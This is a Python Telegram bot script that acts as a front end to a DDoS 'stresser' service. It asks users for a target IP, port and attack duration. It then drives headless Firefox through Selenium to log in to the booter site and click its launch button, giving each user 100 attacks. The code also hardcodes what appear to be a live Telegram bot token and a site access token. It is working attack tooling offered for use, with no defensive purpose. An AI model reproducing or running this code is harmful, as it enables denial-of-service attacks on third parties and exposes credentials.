import os
import json
import logging
import threading
import time
from datetime import datetime
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
from selenium import webdriver
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.firefox import GeckoDriverManager
import asyncio

# ==================== CONFIG ====================
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8521144614:AAG8T8MC3P7m1G_TiGB3AsjgxLnveeNfncI"
WEBSITE_URL = "https://satellitestress.st/attack"
LOGIN_URL = "https://satellitestress.st/login"
WEBSITE_TOKEN = "622de40ac2335a06b834fad06a24c42dcfdc7423b93d35a5add017c08c10db37"

# ==================== ATTACK TRACKING ====================
attack_file = "attacks.json"

def load_attacks():
    try:
        with open(attack_file, 'r') as f:
            return json.load(f)
    except:
        return {"current": None, "user_counts": {}}

def save_attacks(data):
    with open(attack_file, 'w') as f:
        json.dump(data, f, indent=2)

attacks = load_attacks()

# ==================== FIXED ATTACK FUNCTION ====================
def launch_attack(ip, port, duration):
    driver = None
    try:
        options = Options()
        options.add_argument('--headless')
        
        service = Service(GeckoDriverManager().install())
        driver = webdriver.Firefox(service=service, options=options)
        
        # ===== LOGIN =====
        driver.get(LOGIN_URL)
        wait = WebDriverWait(driver, 10)
        
        token_field = wait.until(EC.presence_of_element_located((By.NAME, "token")))
        token_field.clear()
        token_field.send_keys(WEBSITE_TOKEN)
        
        # Check for CAPTCHA
        try:
            captcha = driver.find_element(By.NAME, "captcha")
            return False, "CAPTCHA_REQUIRED"
        except:
            pass
        
        login_btn = driver.find_element(By.XPATH, "//button[contains(text(), 'Login')]")
        login_btn.click()
        time.sleep(3)
        
        # ===== ATTACK PAGE =====
        driver.get(WEBSITE_URL)
        time.sleep(3)
        
        # 🔥 DEBUG: Save page source
        with open("debug_page.html", "w", encoding="utf-8") as f:
            f.write(driver.page_source)
        print("✅ Page source saved to debug_page.html")
        
        # 🔥 DEBUG: Print all inputs
        all_inputs = driver.find_elements(By.TAG_NAME, "input")
        print(f"\n🔍 Found {len(all_inputs)} input fields:")
        for i, inp in enumerate(all_inputs):
            print(f"  Input {i}: placeholder='{inp.get_attribute('placeholder')}', type='{inp.get_attribute('type')}'")
        
        # ===== FILL FORM =====
        if len(all_inputs) >= 5:
            # IP field (index 2)
            all_inputs[2].clear()
            all_inputs[2].send_keys(ip)
            print(f"✅ IP entered: {ip}")
            
            # Port field (index 3)
            all_inputs[3].clear()
            all_inputs[3].send_keys(str(port))
            print(f"✅ Port entered: {port}")
            
            # Duration field (index 4)
            all_inputs[4].clear()
            all_inputs[4].send_keys(str(duration))
            print(f"✅ Duration entered: {duration}")
            
            # ===== LAUNCH BUTTON =====
            buttons = driver.find_elements(By.TAG_NAME, "button")
            for btn in buttons:
                if "Launch" in btn.text:
                    btn.click()
                    print("✅ Launch button clicked")
                    break
            
            time.sleep(3)
            return True, "SUCCESS"
        else:
            return False, f"❌ Sirf {len(all_inputs)} inputs mile (5 expected)"
            
    except Exception as e:
        return False, str(e)
    finally:
        if driver:
            driver.quit()

# ==================== TELEGRAM HANDLERS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[KeyboardButton("🎯 Launch Attack")]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text("🤖 **ATTACK BOT**\n\nClick below to start attack:", reply_markup=reply_markup)

async def attack_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if attacks.get("current") is not None:
        await update.message.reply_text("⚠️ Attack already running. Wait!")
        return
    
    context.user_data["step"] = "ip"
    keyboard = [[KeyboardButton("❌ Cancel")]]
    await update.message.reply_text("🎯 **STEP 1/3**\nSend IP:\nExample: `1.1.1.1`", 
                                   reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True))

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user_id = update.effective_user.id
    
    if text == "❌ Cancel":
        context.user_data.clear()
        await start(update, context)
        return
    
    if text == "🎯 Launch Attack":
        await attack_start(update, context)
        return
    
    if "step" in context.user_data:
        step = context.user_data["step"]
        
        if step == "ip":
            context.user_data["ip"] = text
            context.user_data["step"] = "port"
            await update.message.reply_text("✅ IP saved\n\n**STEP 2/3**\nSend Port:\nExample: `80`")
            
        elif step == "port":
            try:
                port = int(text)
                context.user_data["port"] = port
                context.user_data["step"] = "duration"
                
                keyboard = [
                    [InlineKeyboardButton("30s", callback_data="dur_30"),
                     InlineKeyboardButton("60s", callback_data="dur_60"),
                     InlineKeyboardButton("120s", callback_data="dur_120")],
                    [InlineKeyboardButton("180s", callback_data="dur_180"),
                     InlineKeyboardButton("240s", callback_data="dur_240"),
                     InlineKeyboardButton("300s", callback_data="dur_300")]
                ]
                await update.message.reply_text(
                    f"✅ IP: `{context.user_data['ip']}`\n✅ Port: `{port}`\n\n**STEP 3/3**\nSelect duration:",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
            except:
                await update.message.reply_text("❌ Invalid port. Send number:")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data.startswith("dur_"):
        duration = int(query.data.split("_")[1])
        
        if "ip" not in context.user_data or "port" not in context.user_data:
            await query.message.edit_text("❌ Session expired. Start again.")
            return
        
        ip = context.user_data["ip"]
        port = context.user_data["port"]
        user_id = query.from_user.id
        context.user_data.clear()
        
        attacks["current"] = {"ip": ip, "port": port, "duration": duration, "user_id": user_id}
        save_attacks(attacks)
        
        await query.message.edit_text(f"🔄 **LAUNCHING ATTACK...**\n\nTarget: `{ip}:{port}`\nDuration: {duration}s")
        
        loop = asyncio.get_running_loop()
        
        def attack_thread():
            try:
                success, result = launch_attack(ip, port, duration)
                
                attacks["current"] = None
                
                counts = attacks.get("user_counts", {})
                counts[str(user_id)] = counts.get(str(user_id), 0) + 1
                attacks["user_counts"] = counts
                save_attacks(attacks)
                
                remaining = 100 - counts.get(str(user_id), 0)
                
                async def send_result():
                    if success:
                        await context.bot.send_message(
                            chat_id=query.message.chat_id,
                            text=f"✅ **ATTACK COMPLETED!**\n\n`{ip}:{port}`\n{duration}s\n🎯 Remaining: {remaining}/100"
                        )
                    else:
                        await context.bot.send_message(
                            chat_id=query.message.chat_id,
                            text=f"❌ **FAILED**\n\n{result}"
                        )
                
                asyncio.run_coroutine_threadsafe(send_result(), loop)
                
            except Exception as e:
                attacks["current"] = None
                save_attacks(attacks)
                
                async def send_error():
                    await context.bot.send_message(
                        chat_id=query.message.chat_id,
                        text=f"❌ **ERROR**\n\n{str(e)}"
                    )
                
                asyncio.run_coroutine_threadsafe(send_error(), loop)
        
        thread = threading.Thread(target=attack_thread)
        thread.daemon = True
        thread.start()

# ==================== MAIN ====================
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("="*50)
    print("🔥 FIREFOX ATTACK BOT STARTED")
    print("="*50)
    print(f"👤 Everyone gets 100 attacks")
    print(f"🔑 Token: {WEBSITE_TOKEN[:15]}...")
    print("="*50)
    
    app.run_polling()

if __name__ == "__main__":
    main()
